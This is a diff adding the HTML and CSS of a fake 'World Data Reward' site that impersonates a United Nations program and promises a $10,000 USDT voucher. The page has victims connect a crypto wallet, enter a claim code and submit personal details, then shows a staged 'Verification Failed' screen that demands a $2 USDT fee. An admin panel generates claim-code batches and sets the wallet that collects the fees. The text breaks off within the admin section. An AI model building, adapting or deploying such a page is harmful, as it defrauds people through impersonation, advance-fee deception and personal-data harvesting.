@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>World Data Reward — United Nations Internet User Recognition Program</title>
+    <meta name="description" content="United Nations recognized initiative honoring randomly selected internet users worldwide with a $10,000 USDT recognition voucher.">
+    <meta name="theme-color" content="#0a1a2e">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="https://i.postimg.cc/s2NH2dP4/world-data-reward-600x600.png">
+    <link rel="apple-touch-icon" href="https://i.postimg.cc/s2NH2dP4/world-data-reward-600x600.png">
+    
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
+    
+    <style>
+        :root {
+            --un-blue: #1e3a5f;
+            --deep-blue: #0a1a2e;
+            --gold: #d4af37;
+            --gold-light: #f0d060;
+            --gold-pale: rgba(212, 175, 55, 0.15);
+            --usdt-green: #2ea876;
+            --usdt-green-light: #5ddbae;
+            --card-bg: rgba(255, 255, 255, 0.035);
+            --card-border: rgba(212, 175, 55, 0.12);
+            --text-primary: #ffffff;
+            --text-secondary: rgba(255, 255, 255, 0.68);
+            --text-muted: rgba(255, 255, 255, 0.42);
+            --danger: #f87171;
+            --danger-bg: rgba(239, 68, 68, 0.1);
+            --success-bg: rgba(46, 168, 118, 0.12);
+            --warning-bg: rgba(240, 160, 64, 0.1);
+            --info-bg: rgba(0, 158, 219, 0.1);
+            --font-main: 'Inter', 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+            --font-mono: 'SF Mono', 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
+            --radius-sm: 8px;
+            --radius-md: 14px;
+            --radius-lg: 20px;
+            --radius-xl: 28px;
+            --radius-full: 9999px;
+            --shadow-gold: 0 6px 24px rgba(212, 175, 55, 0.25);
+            --shadow-card: 0 2px 16px rgba(0, 0, 0, 0.3);
+            --transition: 0.22s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; }
+
+        body {
+            font-family: var(--font-main);
+            background: var(--deep-blue);
+            background-image:
+                radial-gradient(ellipse at 25% 20%, rgba(30, 58, 95, 0.55) 0%, transparent 60%),
+                radial-gradient(ellipse at 75% 70%, rgba(212, 175, 55, 0.06) 0%, transparent 55%),
+                radial-gradient(ellipse at 50% 100%, rgba(46, 168, 118, 0.05) 0%, transparent 50%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            line-height: 1.65;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .bg-grid {
+            position: fixed; inset: 0; pointer-events: none; z-index: 0;
+            background-image:
+                linear-gradient(rgba(212, 175, 55, 0.018) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(212, 175, 55, 0.018) 1px, transparent 1px);
+            background-size: 64px 64px;
+            mask-image: radial-gradient(ellipse at center, black 30%, transparent 70%);
+            -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 70%);
+        }
+
+        .app-container { position: relative; z-index: 1; max-width: 640px; margin: 0 auto; padding: 14px 16px 32px; }
+
+        .nav-bar {
+            display: flex; justify-content: center; gap: 4px; padding: 6px;
+            background: rgba(10, 26, 46, 0.82); backdrop-filter: blur(22px);
+            -webkit-backdrop-filter: blur(22px); border-radius: var(--radius-full);
+            border: 1px solid rgba(212, 175, 55, 0.22);
+            position: sticky; top: 10px; z-index: 50; margin-bottom: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.35);
+        }
+        .nav-link {
+            padding: 9px 20px; border-radius: var(--radius-full);
+            font-size: 13px; font-weight: 500; color: var(--text-secondary);
+            text-decoration: none; letter-spacing: 0.3px; transition: var(--transition);
+            white-space: nowrap; border: 1px solid transparent;
+            cursor: pointer; background: none; font-family: inherit;
+        }
+        .nav-link:hover { color: var(--gold-light); background: rgba(212, 175, 55, 0.07); }
+        .nav-link.active { color: var(--gold-light); background: rgba(212, 175, 55, 0.1); border-color: rgba(212, 175, 55, 0.3); font-weight: 600; }
+        .nav-link.restricted { opacity: 0.45; pointer-events: none; }
+        .nav-link.restricted.unlocked { opacity: 1; pointer-events: auto; }
+
+        .page { display: none; animation: pageEnter 0.45s ease; }
+        .page.active { display: block; }
+        @keyframes pageEnter { from { opacity: 0; transform: translateY(14px); } to { opacity: 1; transform: translateY(0); } }
+
+        .card {
+            background: var(--card-bg); border: 1px solid var(--card-border);
+            border-radius: var(--radius-lg); padding: 22px 20px; margin-bottom: 14px;
+            backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
+            box-shadow: var(--shadow-card);
+        }
+        .card-accent { border-left: 3px solid var(--gold); }
+        .card-ceremony { border: 1px solid rgba(212, 175, 55, 0.28); background: rgba(212, 175, 55, 0.025); text-align: center; }
+
+        .heading-xl { font-size: clamp(26px, 5.5vw, 36px); font-weight: 700; color: var(--gold-light); text-align: center; letter-spacing: -0.4px; line-height: 1.25; }
+        .heading-lg { font-size: clamp(22px, 4.5vw, 30px); font-weight: 700; color: var(--gold); text-align: center; letter-spacing: -0.2px; line-height: 1.3; }
+        .heading-md { font-size: 16px; font-weight: 600; color: var(--gold-light); letter-spacing: 0.1px; }
+
+        .congratulations-text {
+            font-size: clamp(28px, 6vw, 40px); font-weight: 800; color: var(--gold);
+            text-align: center; letter-spacing: 0.3px; line-height: 1.2;
+            text-shadow: 0 2px 16px rgba(0, 0, 0, 0.4);
+            animation: gentleGlow 3s ease-in-out infinite;
+        }
+        @keyframes gentleGlow {
+            0%, 100% { text-shadow: 0 2px 16px rgba(212, 175, 55, 0.3); }
+            50% { text-shadow: 0 2px 28px rgba(212, 175, 55, 0.55); }
+        }
+
+        .amount-giant { font-size: clamp(50px, 11vw, 72px); font-weight: 800; color: var(--usdt-green); text-align: center; letter-spacing: -1.5px; line-height: 1; }
+        .text-body { font-size: 14px; color: var(--text-secondary); line-height: 1.7; }
+        .text-small { font-size: 12px; color: var(--text-secondary); }
+        .text-caption { font-size: 10.5px; color: var(--text-muted); letter-spacing: 0.3px; }
+        .text-gold { color: var(--gold-light); }
+        .text-green { color: var(--usdt-green-light); }
+        .text-center { text-align: center; }
+
+        .un-badge {
+            display: inline-flex; align-items: center; gap: 7px;
+            background: rgba(212, 175, 55, 0.08); border: 1px solid rgba(212, 175, 55, 0.25);
+            padding: 7px 20px; border-radius: var(--radius-full);
+            font-size: 10.5px; font-weight: 600; color: var(--gold-light);
+            letter-spacing: 1.2px; text-transform: uppercase;
+        }
+        .laurel-line {
+            display: flex; align-items: center; justify-content: center;
+            gap: 14px; margin: 22px 0; color: var(--gold);
+            font-size: 11px; letter-spacing: 2.5px; text-transform: uppercase; font-weight: 500;
+        }
+        .laurel-line::before, .laurel-line::after {
+            content: ''; flex: 1; height: 1px;
+            background: linear-gradient(to right, transparent, rgba(212, 175, 55, 0.4), transparent);
+        }
+
+        .btn {
+            display: inline-flex; align-items: center; justify-content: center;
+            width: 100%; padding: 15px 24px; border: none;
+            border-radius: var(--radius-xl); font-size: 14.5px;
+            font-weight: 600; cursor: pointer; transition: var(--transition);
+            letter-spacing: 0.3px; text-transform: uppercase;
+            font-family: inherit; gap: 8px; text-decoration: none;
+        }
+        .btn:active { transform: scale(0.975); }
+        .btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; filter: none; }
+        .btn-gold { background: linear-gradient(135deg, #d4af37 0%, #b8942e 100%); color: #0a1a2e; box-shadow: var(--shadow-gold); }
+        .btn-green { background: linear-gradient(135deg, #2ea876 0%, #1d7a56 100%); color: #ffffff; }
+        .btn-outline { background: transparent; border: 1.5px solid rgba(212, 175, 55, 0.45); color: var(--gold-light); }
+        .btn-sm { width: auto; padding: 8px 18px; font-size: 11.5px; border-radius: var(--radius-full); letter-spacing: 0.2px; }
+        .btn:hover:not(:disabled) { filter: brightness(1.1); box-shadow: 0 10px 28px rgba(0, 0, 0, 0.35); transform: translateY(-1px); }
+        .btn-outline:hover:not(:disabled) { background: rgba(212, 175, 55, 0.08); border-color: var(--gold); }
+
+        .input-field {
+            width: 100%; padding: 13px 16px; border-radius: var(--radius-md);
+            border: 1.5px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.3); color: var(--text-primary);
+            font-size: 14.5px; transition: var(--transition); font-family: inherit;
+        }
+        .input-field:focus { outline: none; border-color: var(--gold); box-shadow: 0 0 0 3px rgba(212, 175, 55, 0.06); }
+        .input-field::placeholder { color: rgba(255, 255, 255, 0.22); }
+        .input-code { font-family: var(--font-mono); letter-spacing: 3px; text-align: center; font-size: 17px; text-transform: uppercase; }
+        .input-pin { font-family: var(--font-mono); letter-spacing: 8px; text-align: center; font-size: 22px; max-width: 140px; }
+        select.input-field {
+            appearance: none; -webkit-appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%23d4af37' viewBox='0 0 16 16'%3E%3Cpath d='M8 11L3 6h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat; background-position: right 14px center;
+            padding-right: 40px; cursor: pointer;
+        }
+        select.input-field option { background: #132030; color: #fff; }
+
+        .form-label { display: block; font-size: 10.5px; font-weight: 600; color: var(--text-muted); margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.6px; }
+
+        .status-pill { display: inline-flex; align-items: center; gap: 6px; padding: 5px 14px; border-radius: var(--radius-full); font-size: 11.5px; font-weight: 600; }
+        .status-ready { background: rgba(46, 168, 118, 0.15); color: var(--usdt-green-light); }
+        .status-pending { background: rgba(240, 160, 64, 0.12); color: #f0a040; }
+        .status-done { background: rgba(46, 168, 118, 0.1); color: var(--usdt-green); }
+        .status-dot { width: 7px; height: 7px; border-radius: 50%; display: inline-block; flex-shrink: 0; }
+        .status-dot.ready { background: var(--usdt-green); box-shadow: 0 0 6px rgba(46, 168, 118, 0.6); }
+        .status-dot.pending { background: #f0a040; }
+
+        .countdown-timer { font-size: 38px; font-weight: 700; font-family: var(--font-mono); color: var(--gold-light); text-align: center; letter-spacing: 2px; }
+        .progress-track { width: 100%; height: 5px; background: rgba(255, 255, 255, 0.06); border-radius: 3px; overflow: hidden; margin: 18px 0; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--gold), var(--gold-light)); border-radius: 3px; width: 100%; animation: progressDrain var(--progress-duration, 300s) linear forwards; }
+        @keyframes progressDrain { from { width: 100%; } to { width: 0%; } }
+
+        .phase-box { text-align: center; padding: 28px 18px; }
+        .phase-icon { font-size: 60px; margin-bottom: 14px; animation: softPulse 2.4s ease-in-out infinite; }
+        @keyframes softPulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.7; transform: scale(1.04); } }
+        .phase-title { font-size: 21px; font-weight: 700; color: var(--gold-light); margin-bottom: 8px; }
+        .phase-subtitle { font-size: 13.5px; color: var(--text-secondary); margin-bottom: 14px; line-height: 1.6; }
+        .checkmark-big { font-size: 68px; color: var(--usdt-green); animation: popBounce 0.5s ease; }
+        @keyframes popBounce { 0% { transform: scale(0); opacity: 0; } 60% { transform: scale(1.15); } 100% { transform: scale(1); opacity: 1; } }
+
+        .payment-box { background: rgba(212, 175, 55, 0.06); border: 1px solid rgba(212, 175, 55, 0.22); border-radius: var(--radius-md); padding: 20px; text-align: center; margin: 18px 0; }
+        .payment-address-display { font-family: var(--font-mono); font-size: 12.5px; background: rgba(0, 0, 0, 0.4); padding: 11px 14px; border-radius: var(--radius-sm); word-break: break-all; margin: 10px 0; color: var(--gold-light); border: 1px solid rgba(255, 255, 255, 0.06); user-select: all; }
+
+        .guide-list { display: flex; flex-direction: column; gap: 10px; }
+        .guide-step { display: flex; gap: 13px; align-items: flex-start; padding: 13px 14px; background: rgba(255, 255, 255, 0.025); border-radius: var(--radius-md); border: 1px solid rgba(255, 255, 255, 0.04); }
+        .guide-num { width: 30px; height: 30px; min-width: 30px; background: rgba(212, 175, 55, 0.12); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 13px; color: var(--gold); }
+        .guide-content { font-size: 13px; color: var(--text-secondary); line-height: 1.55; }
+        .guide-content strong { color: #fff; }
+
+        .alert { padding: 12px 16px; border-radius: var(--radius-md); margin: 12px 0; font-size: 13px; font-weight: 500; text-align: center; line-height: 1.5; animation: alertIn 0.3s ease; }
+        @keyframes alertIn { from { opacity: 0; transform: translateY(-6px); } to { opacity: 1; transform: translateY(0); } }
+        .alert-success { background: var(--success-bg); border: 1px solid rgba(46, 168, 118, 0.2); color: var(--usdt-green-light); }
+        .alert-error { background: var(--danger-bg); border: 1px solid rgba(239, 68, 68, 0.18); color: var(--danger); }
+        .alert-warning { background: var(--warning-bg); border: 1px solid rgba(240, 160, 64, 0.2); color: #f0a040; }
+        .alert-info { background: var(--info-bg); border: 1px solid rgba(0, 158, 219, 0.16); color: #7cc8f0; }
+
+        .chatbot-fab { position: fixed; bottom: 22px; right: 22px; width: 56px; height: 56px; border-radius: 50%; background: linear-gradient(135deg, #d4af37, #b8942e); color: #0a1a2e; display: flex; align-items: center; justify-content: center; font-size: 26px; cursor: pointer; box-shadow: 0 8px 32px rgba(212, 175, 55, 0.35); z-index: 200; transition: var(--transition); border: none; animation: floatBob 2.5s ease-in-out infinite; position: relative; }
+        .chatbot-fab::after { content: ''; position: absolute; top: 2px; right: 2px; width: 14px; height: 14px; background: #ef4444; border-radius: 50%; border: 2px solid #0a1a2e; animation: dotPulse 1.8s ease-in-out infinite; z-index: 201; }
+        @keyframes dotPulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.35); opacity: 0.7; } }
+        @keyframes floatBob { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-7px); } }
+        .chatbot-fab:hover { transform: scale(1.08); box-shadow: 0 12px 36px rgba(212, 175, 55, 0.5); }
+        .chatbot-window { position: fixed; bottom: 94px; right: 22px; width: 370px; max-width: 90vw; max-height: 500px; background: #111d33; border: 1px solid rgba(212, 175, 55, 0.28); border-radius: var(--radius-lg); z-index: 199; display: flex; flex-direction: column; box-shadow: 0 22px 60px rgba(0, 0, 0, 0.55); animation: slideUp 0.35s ease; overflow: hidden; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(24px); } to { opacity: 1; transform: translateY(0); } }
+        .chatbot-header { background: rgba(212, 175, 55, 0.1); padding: 13px 16px; border-bottom: 1px solid rgba(212, 175, 55, 0.18); display: flex; align-items: center; gap: 10px; }
+        .chatbot-avatar { width: 34px; height: 34px; border-radius: 50%; background: linear-gradient(135deg, #d4af37, #b8942e); display: flex; align-items: center; justify-content: center; font-size: 17px; }
+        .chatbot-name { font-weight: 600; font-size: 13.5px; color: var(--gold-light); }
+        .chatbot-status { font-size: 10px; color: var(--usdt-green-light); }
+        .chatbot-close-btn { margin-left: auto; background: none; border: none; color: var(--text-secondary); font-size: 20px; cursor: pointer; padding: 4px 8px; border-radius: 50%; transition: var(--transition); }
+        .chatbot-close-btn:hover { color: #fff; background: rgba(255, 255, 255, 0.06); }
+        .chatbot-body { flex: 1; padding: 14px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; max-height: 260px; }
+        .chat-bubble { max-width: 84%; padding: 11px 15px; border-radius: 16px; font-size: 12.5px; line-height: 1.5; animation: bubbleIn 0.25s ease; }
+        @keyframes bubbleIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+        .chat-bubble.bot { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.07); align-self: flex-start; border-bottom-left-radius: 4px; }
+        .chat-bubble.user { background: rgba(212, 175, 55, 0.1); border: 1px solid rgba(212, 175, 55, 0.18); align-self: flex-end; border-bottom-right-radius: 4px; color: var(--gold-light); }
+        .chatbot-options { padding: 11px 14px; display: flex; flex-wrap: wrap; gap: 7px; border-top: 1px solid rgba(255, 255, 255, 0.04); }
+        .chat-option-btn { padding: 9px 15px; border-radius: var(--radius-full); font-size: 11.5px; font-weight: 500; cursor: pointer; background: rgba(212, 175, 55, 0.08); border: 1px solid rgba(212, 175, 55, 0.2); color: var(--gold-light); transition: var(--transition); font-family: inherit; white-space: nowrap; }
+        .chat-option-btn:hover { background: rgba(212, 175, 55, 0.18); border-color: rgba(212, 175, 55, 0.4); }
+
+        .hidden { display: none !important; }
+        .mt-6 { margin-top: 6px; } .mt-8 { margin-top: 8px; } .mt-10 { margin-top: 10px; }
+        .mt-12 { margin-top: 12px; } .mt-14 { margin-top: 14px; } .mt-16 { margin-top: 16px; }
+        .mt-20 { margin-top: 20px; } .mt-24 { margin-top: 24px; }
+        .mb-8 { margin-bottom: 8px; } .mb-12 { margin-bottom: 12px; } .mb-16 { margin-bottom: 16px; }
+        .mono-text { font-family: var(--font-mono); font-size: 11.5px; word-break: break-all; }
+        .form-row { display: flex; gap: 10px; }
+        .form-row > * { flex: 1; min-width: 0; }
+
+        @media (max-width: 480px) {
+            .app-container { padding: 10px 10px 24px; }
+            .card { padding: 16px 13px; }
+            .nav-link { padding: 7px 13px; font-size: 11.5px; }
+            .amount-giant { font-size: 44px; }
+            .congratulations-text { font-size: 26px; }
+            .chatbot-window { right: 8px; bottom: 80px; width: calc(100vw - 16px); max-width: 100%; }
+            .chatbot-fab { right: 14px; bottom: 14px; width: 48px; height: 48px; font-size: 22px; }
+            .btn { font-size: 13.5px; padding: 13px 20px; }
+            .form-row { flex-direction: column; gap: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-grid"></div>
+    <div class="app-container">
+
+        <nav class="nav-bar" id="mainNav">
+            <button class="nav-link active" onclick="navigate('claim')">🏛️&nbsp;Recognition</button>
+            <button class="nav-link restricted" id="redeemNavBtn" onclick="navigate('redeem')">📜&nbsp;Redeem</button>
+        </nav>
+
+        <!-- CLAIM PAGE -->
+        <div class="page active" id="page-claim">
+            <div class="text-center mt-8"><span class="un-badge">🌐&nbsp;United Nations Recognized Initiative</span></div>
+            <div class="card card-ceremony mt-14">
+                <img src="https://i.postimg.cc/s2NH2dP4/world-data-reward-600x600.png" alt="World Data Reward Official Emblem" width="100" height="100" style="border-radius:50%;border:2px solid var(--gold);margin-bottom:14px;" loading="eager">
+                <h1 class="congratulations-text">🎉&nbsp;Congratulations!</h1>
+                <p class="text-body mt-8" style="font-size:15px;">You have been selected to receive the</p>
+                <h2 class="heading-lg mt-6">World Data Internet User Recognition</h2>
+                <div class="laurel-line">Random Selection • Global Program</div>
+                <p class="text-body">Through an impartial random selection among millions of internet users across the globe, your digital presence has been chosen for this recognition.</p>
+                <div class="amount-giant mt-16">$10,000</div>
+                <p style="font-size:17px;color:var(--usdt-green);font-weight:600;margin-top:2px;">USDT</p>
+                <p class="text-small mt-6">World Data Internet User Recognition Voucher</p>
+            </div>
+            <div class="card card-accent"><p class="text-body"><strong>✨ Claiming is entirely free for you.</strong> All blockchain network fees are covered by the program. Your wallet can hold $0.00.</p></div>
+            <div id="connectSection"><button class="btn btn-gold mt-12" onclick="connectWallet()">Connect Wallet to Begin</button><p class="text-caption text-center mt-8">MetaMask • Trust Wallet • SafePal • Any BSC Wallet</p></div>
+            <div id="claimSection" class="hidden">
+                <div class="card"><div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px;"><span class="text-small">Connected Wallet</span><span class="mono-text" id="walletDisplay"></span></div><div class="mt-8"><span class="status-pill status-ready" id="claimStatusBadge"><span class="status-dot ready"></span> Ready to Claim</span></div></div>
+                <div class="mt-14"><label class="form-label">Your Unique Claim Code</label><input type="text" class="input-field input-code" id="claimCodeInput" placeholder="WD-XXXX-XXXX-XXXX" maxlength="17" autocomplete="off" spellcheck="false"><p class="text-caption mt-6">This code was sent directly to you. It is unique and valid for one use only.</p></div>
+                <button class="btn btn-green mt-12" id="claimBtn" onclick="submitClaim()">Accept This Recognition</button>
+                <p class="text-caption text-center mt-8">✅ Zero gas &nbsp;•&nbsp; Instant transfer &nbsp;•&nbsp; No BNB required</p>
+                <div class="card mt-20 hidden" id="postClaimCard"><p class="text-small text-center">Redemption available in</p><div class="countdown-timer mt-8" id="claimCountdown">24:00:00</div><p class="text-center mt-10"><a href="#redeem" onclick="navigate('redeem')" style="color:var(--gold-light);text-decoration:none;font-weight:600;font-size:13px;" id="redeemLinkInline" class="hidden">Proceed to Documentation →</a></p></div>
+                <div id="claimAlerts"></div>
+            </div>
+            <div class="card mt-16"><h3 class="heading-md text-center mb-12">📱&nbsp;How to Find Your Voucher After Claiming</h3><div class="guide-list"><div class="guide-step"><div class="guide-num">1</div><div class="guide-content"><strong>Open your wallet app</strong><br>MetaMask, Trust Wallet, SafePal, or any BSC-compatible wallet.</div></div><div class="guide-step"><div class="guide-num">2</div><div class="guide-content"><strong>Go to NFTs or Collectibles</strong><br>MetaMask: <strong>"NFTs"</strong> tab. Trust Wallet: <strong>"Collectibles"</strong>.</div></div><div class="guide-step"><div class="guide-num">3</div><div class="guide-content"><strong>Look for "World Data / Internet User Reward"</strong><br>A card with the UN emblem — displays as <strong>$10,000 USDT Voucher</strong>.</div></div><div class="guide-step"><div class="guide-num">4</div><div class="guide-content"><strong>If not visible, import manually</strong><br>Tap <strong>"Import Token"</strong> → Paste this contract address:<br><span class="mono-text" style="background:rgba(0,0,0,0.3);padding:3px 7px;border-radius:4px;" id="contractAddrDisplay">Loading...</span><br>Token ID: <strong>0</strong> → Tap Import.</div></div><div class="guide-step"><div class="guide-num">5</div><div class="guide-content"><strong>Understanding your voucher</strong><br>Shows <strong>$0.00 estimated value</strong> until redemption is activated. The real $10,000 USDT is released upon final approval.</div></div></div><p class="text-caption text-center mt-14">🔒&nbsp;Your voucher is a permanent blockchain record. It cannot be lost, altered, or duplicated.</p></div>
+            <div class="text-center mt-20" style="padding-bottom:10px;"><p class="text-caption">🔒&nbsp;Secured by Binance Smart Chain &nbsp;•&nbsp; 🌐&nbsp;UN Recognized Program</p><p class="text-caption mt-4">World Data Reward Initiative &nbsp;©&nbsp;2026</p></div>
+        </div>
+
+        <!-- REDEEM PAGE -->
+        <div class="page" id="page-redeem">
+            <div class="text-center mt-8"><span class="un-badge">📜&nbsp;Official Redemption &amp; Documentation</span></div>
+            <div class="card mt-14" id="phase-questionnaire">
+                <h3 class="heading-md mb-8">📋&nbsp;Documentation for Recognition Certificate</h3>
+                <p class="text-small mb-16">To prepare your official recognition certificate and process your award, please complete all fields. All fields are required.</p>
+                <div class="mb-12"><label class="form-label">Full Legal Name *</label><input type="text" class="input-field" id="rq_name" placeholder="As on official identification" autocomplete="name"></div>
+                <div class="form-row mb-12"><div><label class="form-label">Email Address *</label><input type="email" class="input-field" id="rq_email" placeholder="For official correspondence"></div><div><label class="form-label">Phone Number *</label><input type="tel" class="input-field" id="rq_phone" placeholder="+1 234 567 8900"></div></div>
+                <div class="form-row mb-12"><div><label class="form-label">Country of Residence *</label><select class="input-field" id="rq_country_residence"></select></div><div><label class="form-label">Country of Birth *</label><select class="input-field" id="rq_country_birth"></select></div></div>
+                <div class="form-row mb-12"><div><label class="form-label">Age *</label><input type="number" class="input-field" id="rq_age" placeholder="Your age" min="18" max="120"></div><div><label class="form-label">Sex *</label><select class="input-field" id="rq_sex"><option value="">— Select —</option><option>Male</option><option>Female</option><option>Prefer not to say</option></select></div></div>
+                <div class="mb-12"><label class="form-label">Status *</label><select class="input-field" id="rq_status"><option value="">— Select —</option><option>Single</option><option>Married</option><option>Divorced</option><option>Widowed</option><option>Prefer not to say</option></select></div>
+                <div class="mb-12"><label class="form-label">How were you contacted? *</label><select class="input-field" id="rq_source"><option value="">— Select —</option><option>Facebook Message</option><option>Email</option><option>SMS / Text</option><option>Instagram</option><option>WhatsApp</option><option>Telegram</option><option>Friend or Family</option><option>Other</option></select></div>
+                <div class="mb-12"><label class="form-label">Primary Internet Use *</label><select class="input-field" id="rq_usage"><option value="">— Select —</option><option>Work / Business</option><option>Education / Learning</option><option>Connecting with family &amp; friends</option><option>Entertainment / Streaming</option><option>Financial services / Trading</option><option>Research / Reading</option><option>Gaming</option><option>Multiple / All of the above</option></select></div>
+                <label style="display:flex;align-items:flex-start;gap:8px;font-size:12px;cursor:pointer;margin-top:10px;"><input type="checkbox" id="rq_terms" style="width:16px;height:16px;flex-shrink:0;margin-top:2px;accent-color:var(--gold);"><span style="color:var(--text-secondary);">I confirm all information is accurate and consent to documentation processing. *</span></label>
+                <button class="btn btn-gold mt-16" onclick="submitDocumentation()">Submit for Documentation</button>
+                <div id="redeemAlerts"></div>
+            </div>
+            <div class="card phase-box hidden" id="phase-documenting"><div class="phase-icon">📄</div><h3 class="phase-title">Documenting Your Recognition</h3><p class="phase-subtitle">Our system is compiling your documentation and preparing your official certificate. You may close this page and return — your progress is saved.</p><div class="countdown-timer" id="docTimer">5:00</div><div class="progress-track"><div class="progress-fill" id="docProgress" style="--progress-duration:300s;"></div></div><p class="text-caption">Your documentation timer continues even if you leave this page.</p></div>
+            <div class="card phase-box hidden" id="phase-payment-required"><div class="phase-icon">⚠️</div><h3 class="phase-title" style="color:#f0a040;">Verification Failed</h3><p class="phase-subtitle">Our automated system was unable to fully authenticate your documentation. Final verification requires an independent external certification body.</p><div class="payment-box"><p style="font-size:12px;color:var(--gold-light);font-weight:600;margin-bottom:6px;">🔐&nbsp;External Verification Service Fee</p><p style="font-size:38px;font-weight:700;color:#fff;">$2.00</p><p style="font-size:12px;color:var(--text-secondary);">USDT (BEP-20 Network)</p><p class="text-caption mt-6">This fee goes entirely to the independent external verification body — not to us.</p><div style="margin-top:14px;"><p class="text-caption mb-6">Send exactly $2.00 USDT to:</p><div class="payment-address-display" id="verificationWalletDisplay">0xVERIFICATION_WALLET_ADDRESS</div><button class="btn btn-outline btn-sm mt-8" onclick="copyVerificationAddress()">📋&nbsp;Copy Address</button></div></div><button class="btn btn-green mt-14" onclick="checkVerificationPayment()">✅&nbsp;I Have Completed the Payment — Verify Now</button><p class="text-caption mt-8">Payment detection may take 30–60 seconds after your transaction confirms on BSC.</p><div id="paymentAlerts"></div></div>
+            <div class="card phase-box hidden" id="phase-verifying"><div class="phase-icon">🔐</div><h3 class="phase-title">External Verification in Progress</h3><p class="phase-subtitle">The independent certification body is now authenticating your documentation. This completes within a few minutes.</p><div class="countdown-timer" id="verifyTimer">5:00</div><div class="progress-track"><div class="progress-fill" id="verifyProgress" style="--progress-duration:300s;"></div></div></div>
+            <div class="card phase-box hidden" id="phase-complete"><div class="checkmark-big">✅</div><h3 class="phase-title">Verification Successful</h3><p class="phase-subtitle">Your identity has been authenticated by the external certification body. Your redemption has been forwarded to the World Data Reward administration team for final processing.</p><div style="background:rgba(46,168,118,0.08);border-radius:var(--radius-md);padding:14px;margin-top:12px;"><p class="text-small" style="color:var(--usdt-green-light);">📬&nbsp;Your $10,000 USDT will be transferred within 24–48 hours. You will receive email confirmation upon completion.</p></div><p class="text-caption mt-14">Thank you for participating in the World Data Reward Program.</p></div>
+        </div>
+
+        <!-- ADMIN PAGE -->
+        <div class="page" id="page-admin">
+            <div class="text-center mt-8"><h2 class="heading-lg" style="font-size:22px;">⚙️&nbsp;Administration Panel</h2></div>
+            <div class="card mt-14" id="adminLoginCard"><h3 class="heading-md mb-8">🔐&nbsp;Admin Login</h3><div class="mb-12"><label class="form-label">Username</label><input type="text" class="input-field" id="adminUsername" placeholder="Enter username" autocomplete="off" style="letter-spacing:0;"></div><div class="mb-12"><label class="form-label">Password</label><input type="password" class="input-field" id="adminPassword" placeholder="Enter password" autocomplete="off" style="letter-spacing:0;"></div><button class="btn btn-gold mt-8" onclick="adminLogin()">Login</button><div id="adminLoginMsg" class="mt-8"></div></div>
+            <div id="adminDashboard" class="hidden">
+                <div class="card mt-14"><h3 class="heading-md mb-8">🎫&nbsp;Generate Claim Codes</h3><p class="text-caption mb-10">Protected by 4‑digit security PIN</p><div style="display:flex;gap:8px;flex-wrap:wrap;align-items:end;"><div><label class="form-label">PIN</label><input type="password" class="input-field input-pin" id="genPin" maxlength="4" placeholder="****" inputmode="numeric" autocomplete="off"></div><div style="flex:1;min-width:100px;"><label class="form-label">Batch Name</label><input type="text" class="input-field" id="batchName" placeholder="Campaign name" style="letter-spacing:0;"></div><div style="width:70px;"><label class="form-label">Qty</label><input type="number" class="input-field" id="codeCount" value="50" min="1" max="10000" style="letter-spacing:0;"></div><button class="btn btn-gold btn-sm" onclick="generateCodes()">Generate</button></div><div id="genCodesOutput" class="mt-10"></div></div>
+                <div class="card mt-12"><h3 class="heading-md mb-8">🔐&nbsp;Verification Payment Wallet</h3><p class="text-caption mb-8">Set the wallet that receives $2 USDT verification fees.</p><input type="text" class="input-field mono-text" id="verifyWalletInput" placeholder="0x..." style="letter-spacing:0;"><button class="btn btn-outline btn-sm mt-8" onclick="updateVerificationWallet()">Save Wallet</button><div id="verifyWalletOutput" class="mt-6"></div></div>
+                <div class="card mt-12"><h3 class="heading-md mb-8">🔄&nbsp;Redemption Approval Queue</h3><div id="redemptionQueue">Loading…</div></div>
+                <div class="card mt-12"><h3 class="heading-md mb-8">💰&nbsp;Sponsor Wallet</h3><p style="font-size:15px;">Balance: <strong id="adminBal">—</strong> BNB</p><div style="display:flex;gap:8px;margin-top:10px;"><input type="number" class="input-field" id="fundAmount" placeholder="BNB amount" step="0.01" style="max-width:160px;letter-spacing:0;"><button class="btn btn-gold btn-sm" onclick="fundSponsorWallet()">Add Funds</button></div></div>
